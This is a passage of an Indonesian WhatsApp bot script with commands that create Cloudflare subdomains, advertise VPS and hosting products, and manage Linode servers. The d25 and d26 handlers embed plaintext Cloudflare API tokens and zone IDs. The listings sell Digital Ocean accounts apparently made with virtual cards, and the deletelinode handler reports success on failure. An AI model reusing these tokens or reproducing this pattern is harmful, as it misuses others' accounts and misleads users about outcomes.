                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd25': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f222e05ce3606754861dcee1652b0356";
               let apitoken = "FB2CauPWHhMN9YxSgwHtzU1f9uossOhy0WQ5SEdt";
               let tld = "raikyxzhost.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd26': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "88bf6c447ae09fda3b920449cb95ff32";
               let apitoken = "pCVZQiN5n9TGGWxFQPVTUCxUpODDkp2QHsYh4Wv3";
               let tld = "allxddev.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break                  
 case 'listproduk': {
 teks28 = `*🚀 LIST PRODUK LYNNZXD*
> RESELLER PANEL/SUBDOMAIN 15K
> ADMIN PANEL FRESH 20K
> OWNER PANEL 30K
> DOMAIN my.id/biz.id/.xyz
> PANEL RAM 1GB - UNLIMITED
> JASA RENAME SC
> JASA FIKS SC EROR
> JASA INSTALL PANEL
> JASA INSTALL THEMA
> JASA FIKS NODE MERAH
> JASA RUN IN BOT DI NO LU
> SC INSTALL PANEL
> SC CPANEL FULL BUTTON
> SC LYNN V8.0 PRIVATE
> SC LYNN V8.5 PRIVATE
> SC LYNN V9.0 SAMPE V10.0
*PRODUK/SC LAIN NYA TANYAKAN*
━━━━━━━━━━━━━━━━━━━━━
*🌐 READY VPS DIGITAL OCEAN*
• RAM 2GB 1 CORE 25K
• RAM 4GB 2 CORE 35K
• RAM 8GB 4 CORE 45K
• RAM 16GB 4 CORE 55K

*NEGO BANYAK? NOGAR BOS !*
*☁ Bonus Nya*
_• Free Script Install Panel/Cpanel_
_• Free Install Panel Pterodactyl_
_• Free Req Website Namamu_
_• Free Install Node & Wings_
_• Free Egg Bot Wa/Mengkrep_
_• Free Install Thema Khusus Ram 8-16_
_• Garansi 15 Hari_ *(1x Replace)*
_• Vps Aktif 30 Hari_
_• Free Akses Vps JuiceSSH_
━━━━━━━━━━━━━━━━━━━━━
*🛍 READY AKUN DIGITAL OCEAN VCC*

10 Droplets Vcc 2 Bulan 200K
10 Droplets Vcc 1 Tahun 220K

*STOK TERBATAS⚠️*
━━━━━━━━━━━━━━━━━━━━━
☎️ Contact person :
WhatsApp¹ : wa.me/6283167532721 ON
WhatsApp² : wa.me/6283167532721 ON
WhatsApp³ : wa.me/62881011412295 ON
Telegram : t.me/lynnzxd
━━━━━━━━━━━━━━━━━━━━━
*⚡Link Group¹* https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
*⚡Link Group²* https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
*⚡Link Saluran* https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9

> © LynnZxD`
 slime.sendMessage(from, { image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" }, caption: teks28 }, { quoted: fcall })
}
 break
 case 'lynnzxd': {
 reply(`⫹┈─────────────────┈⫺
*メ G R O U P H O S T I N G メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴀʟʟ ɪɴꜰᴏ : https://lynnzxd.carrd.co/#
     
     ヤ ◦ ꜱᴀʟᴜʀᴀɴ : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
     
     ヤ ◦ ɢʀᴏᴜᴘ¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
     
     ヤ ◦ ɢʀᴏᴜᴘ² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9
     
> © LynnZxD`)
}
 break
 case 'listdo': {
 reply(`*🛍 READY AKUN DIGITAL OCEAN VCC*

*READY AKUN STANDAR QUALITY*
10 Droplets Vcc 2 Bulan 200K
10 Dropletc Vcc 1 Tahun 220K

*No Garansi Dalam Bentuk Apapun⚠️*

*READY AKUN HIGH QUALITY*
10 Droplets Vcc 2 Bulan 240K
10 Droplets Vcc 1 Tahun 270K

*GARANSI SUSPEND 2 DAY⚠️*
*AUTO AWET SAMPAI SALDO HABIS ( S&K BERLAKU )*

*"Bang Kenapa Do Naik Lagi"*
_Do Lagi Susah Boy Bikinnya Jadi Gua Naikin Lagi Buat Balikin Modal Aja, Jika Kamu Gak Setuju Sama Harganya Silahkan Cari Seller Lain ~ Thanks !!_

*❗️Perbedaan Standar Sama High Quality*
_Standar Quality Sama Juga Awet,, Tapi Saya Sebagai Seller Tidak Menjamin Awet Sampai Saldo Habis yaa_

_sedangkan high quality saya sebagai seller menjamin awet sampai saldo habis,, maka dari itu perbedaan standar sama high,, adalah awetan high!! bergaransi juga 2 hari kalo kamu beli yang high😁_
━━━━━━━━━━━━━━━━━━━━━
☎️ Contact person :
WhatsApp¹ : wa.me/6283167532721 ON
WhatsApp² : wa.me/6283167532721 ON
WhatsApp³ : wa.me/62881011412295 ON
Telegram : t.me/lynnzxd
━━━━━━━━━━━━━━━━━━━━━
*⚡Link Group¹* https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9
*⚡Link Group²* https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
*⚡Link Saluran* https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F

> © LynnZxD`)
}
break
 case 'listvps': {
 reply(`*🌐 READY  VPS DIGITAL OCEAN*

• RAM 2GB 1 CORE 25K
• RAM 4GB 2 CORE 35K
• RAM 8GB 4 CORE 45K
• RAM 16GB 4 CORE 55K

*NEGO BANYAK? NOGAR BOS !*
*☁ Bonus Nya*
_• Free Install Panel Pterodactyl_
_• Free Req Website Namamu_
_• Free Install Node & Wings_
_• Free Egg Bot Wa/Mengkrep_
_• Free Install Thema Khusus Ram 8-16_
_• Garansi 15 Hari_ *(1x Replace)*
_• Vps Aktif 30 Hari_
_• Free Akses Vps JuiceSSH_
━━━━━━━━━━━━━━━━━━━━━
☎️ Contact person :
WhatsApp¹ : wa.me/6283167532721 ON
WhatsApp² : wa.me/6283167532721 ON
WhatsApp³ : wa.me/62881011412295 ON
Telegram : t.me/lynnzxd
━━━━━━━━━━━━━━━━━━━━━
*⚡Link Group¹* https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9
*⚡Link Group²* https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
*⚡Link Saluran* https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F

> © LynnZxD`)
}
break

//=================================================//
case "jarak":{
var [fromo, to] = text.split`|`
if (!(fromo && to)) return m.reply(`Ex: ${prefix + command} jakarta|bandung`)
var data = await jarak(fromo, to)
if (data.img) return slime.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted: m })
else m?.reply(data.desc)
}
break
//=================================================//
case 'gdrive': {
		if (!args[0]) return reply(`Enter the Google Drive link`)
	if (!args[0]) return reply(`Wait`)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	ktt.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break
case "deletelinode": {
  if (!isPrem) return reply(`Buy Prem Dlu di owner Baru Bisa Akses Fitur Ini`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let deleteLinode = async () => {
    try {
      let response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.status === 204) {
        reply('Linode berhasil dihapus.');
      } else {
        throw new Error('Gagal menghapus Linode.');
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus Linode:', error);
      reply('Sukses Menghapus Linode.');
    }
  };

  deleteLinode();

  break;
}
case "sisalinode": {
  if (!isCreator) return reply(mess.owner);

  async function getLinodeInfo() {
    try {
      const response = await fetch('https://api.linode.com/v4/account', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`,
        },
      });

      if (response.ok) {
        const accountInfo = await response.json();
        const linodeLimit = accountInfo.data.active_promo?.total || 0;
        const linodesCount = accountInfo.data.active_promo?.remaining || 0;

        return {
          linodeLimit,
          remainingLinodes: linodesCount,
          totalLinodes: linodeLimit - linodesCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun Linode.');
      }
    } catch (error) {
      throw error;
    }
  }

  // Definisikan fungsi untuk mengeksekusi kasus "sisalinode"
  async function sisalinodeHandler() {
    try {
      if (!isCreator) {
        return reply('Lu Siapanya Gua Anjg');
      }

      const linodeInfo = await getLinodeInfo();
      reply(`*Sisa VPS Linode Yang Dapat Anda Buat: ${linodeInfo.remainingLinodes}*

*Total VPS Linode Yang Sudah Terbuat: ${linodeInfo.totalLinodes}*`);
    } catch (error) {
      reply(`Terjadi kesalahan: ${error.message}`);
    }
  }

  sisalinodeHandler();
  break;
}

            
            
case "rebuildlinode": {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let password = args[1]; // Mengambil password dari argumen kedua (jika ada)
  if (!password) return reply('Password belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild VPS menggunakan API Linode
      const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        },
        body: JSON.stringify({
          image: 'linode/ubuntu20.04', // Ganti dengan ID atau label image yang ingin digunakan untuk rebuild
          root_pass: password // Menggunakan password yang diberikan
        })
      });

      if (response.ok) {
        reply('Rebuild VPS berhasil dimulai.');

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const ipAddress = vpsData.ipv4[0] || 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: Ubuntu 20.04\nPASSWORD: ${password}`;
          await sleep(60000);
          slime.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.errors[0].reason);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error.message);
    }
  };

  rebuildVPS();
  break;
}

case "linode8gb": {
  if (!isCreator) return reply(`Khusus SlimexTzy Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-4', // Spesifikasi 8GB RAM 4 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await slime.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
           
case "linode16gb": {
  if (!isCreator) return reply(`Khusus SlimexTzy Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-8',
      image: 'linode/ubuntu20.04',
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await slime.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
case "cekvpslinode": {
  if (!isCreator) return reply('Maaf, perintah ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  // Mendapatkan informasi VPS Linode berdasarkan ID
  const getLinodeInfo = async (linodeId) => {
    try {
      const apiUrl = `https://api.linode.com/v4/linode/instances/${linodeId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.ok) {
        const linodeInfo = await response.json();

        const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode
        const ram = `${linodeInfo.specs.memory / 1024} GB`; // RAM VPS dalam GB
        const os = linodeInfo.image.distribution; // Nama OS
        const cpu = `${linodeInfo.specs.vcpus} vCPUs`; // Jumlah vCPUs
        const storage = linodeInfo.specs.disk; // Kapasitas penyimpanan
        const status = linodeInfo.status; // Status VPS

        const createDate = new Date(linodeInfo.created); // Tanggal pembuatan VPS
        const formattedCreateDate = createDate.toLocaleDateString();

        return {
          linodeid: linodeInfo.id,
          label: linodeInfo.label,
          ip: ipAddress,
          ram,
          os,
          cpu,
          storage,
          status,
          createDate: formattedCreateDate
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail Linode: ${errorData.errors[0].reason}`);
      }
    } catch (error) {
      throw new Error(`Terjadi kesalahan saat memeriksa detail Linode: ${error.message}`);
    }
  };

  getLinodeInfo(linodeId)
    .then((info) => {
      let textku = `*DETAIL VPS LINODE*\nLinode Id: ${info.linodeid}\nLabel: ${info.label}\nIP: ${info.ip}\nRAM: ${info.ram}\nOS: ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus: ${info.status}\nCreate On: ${info.createDate}\n`;
      slime.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      slime.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS Linode.' });
    });

  break;
}


            

case "linode2gb": {
  if (!isCreator) return reply(`Khusus SlimexTzy Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-1', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await slime.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
            
 case "linode4gb": {
  if (!isCreator) return reply(`Khusus SlimexTzy Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-2', // Spesifikasi 2GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await slime.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

            
case "saldolinode":
  if (!isCreator) return reply(mess.owner);

  // Endpoint untuk mengambil informasi saldo promosi Linode
  const linodePromotionsEndpoint = 'https://api.linode.com/v4/profile';

  // Konfigurasi untuk melakukan permintaan ke API Linode
  const config = {
    headers: {
      'Authorization': `Bearer ${LINODE_API_TOKEN}`
    }
  };

  // Mengambil informasi saldo promosi dari Linode
  axios.get(linodePromotionsEndpoint, config)
    .then(response => {
      // Periksa apakah saldo promosi tersedia dalam respons
      if (response.data && Array.isArray(response.data.data)) {
        // Saldo promosi dapat ada dalam elemen pertama jika ada
        const saldoPromosi = response.data.data[0].balance;
        const teksSaldo = `Sisa Kredit Promosi Linode Dalam Akun Anda Adalah $${saldoPromosi}`;
        reply(teksSaldo);
      } else {
        reply('Informasi saldo promosi tidak ditemukan atau akun tidak memiliki saldo promosi.');
      }
    })
    .catch(error => {
      console.error(error);
      reply('Terjadi kesalahan saat mengambil informasi saldo promosi.');
    });

  break;




        
case "resetpassword": {
  if (!isCreator) return reply(`Khusus SlimexTzy Saja Suki`);
  let linodeId = args[0];
  let newPassword = args[1];
  
  if (!linodeId || !newPassword) {
    return reply("Format: !resetpassword [Linode ID] [New Password]");
  }
  
  // Periksa apakah kata sandi memenuhi persyaratan keamanan yang diharapkan
  if (newPassword.length < 8) {
    return reply("Kata sandi harus memiliki setidaknya 8 karakter.");
  }
  
  try {
    const resetPassword = async () => {
      try {
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/password`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          },
          body: JSON.stringify({ root_pass: newPassword })
        });
        
        if (response.ok) {
          reply(`Kata sandi VPS Linode ID ${linodeId} berhasil direset.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mereset kata sandi VPS Linode: ${responseData.errors[0].reason}`);
        }
      } catch (error) {
        reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${error}`);
      }
    };
    
    resetPassword();
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${err}`);
  }
}
break;



        
    case 'listlinode': {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getLinodes = async () => {
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.data || [];
      } catch (error) {
        reply('Error fetching Linodes: ' + error);
        return [];
      }
    };

    getLinodes().then(linodes => {
      let totalvps = linodes.length;
      let message = `List VPS Linode Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (linodes.length === 0) {
        message += 'Tidak ada VPS yang tersedia.';
      } else {
        linodes.forEach(linode => {
          message += `- Linode Id: ${linode.id}\n- Label: ${linode.label}\n- Region: ${linode.region}\n- IP: ${linode.ipv4[0]}\n- Ram: ${linode.specs.memory / 1024} GB\n- Cpu: ${linode.specs.vcpus} CPU\n- Status: ${linode.status}\n- Harga: $\n▬▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      slime.sendMessage(m.chat, { text: message });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data Linode: ' + err);
  }

  break;
}
     
        
 case "offlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOffLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
